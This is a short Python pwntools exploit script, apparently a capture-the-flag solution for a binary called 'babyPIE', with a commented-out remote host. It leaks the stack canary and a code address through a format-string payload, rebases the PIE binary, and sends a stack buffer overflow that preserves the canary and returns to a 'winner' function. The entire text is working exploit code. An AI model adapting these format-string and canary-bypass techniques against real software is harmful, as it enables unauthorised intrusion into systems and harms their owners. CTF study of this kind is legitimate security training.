from pwn import *

p = process("./babyPIE")
#p = remote("34.213.62.140", 6501)
elf = context.binary = ELF("./babyPIE")
p.recvline()
payload  = b'%22$p %25$p'
p.sendline(payload)
leak,canary=p.recvline()[:-1].split()
leak,canary = int(leak,16),int(canary,16)

pop_rdi_offset = 0x0000000000001383
ret_offset = 0x000000000000101a
elf.address = leak - 0x1100

payload = flat(
    b'a'*152,
    canary,
    b'a'*8,
    elf.address+ret_offset,
    elf.sym.winner
)

p.sendline(payload)
p.interactive()
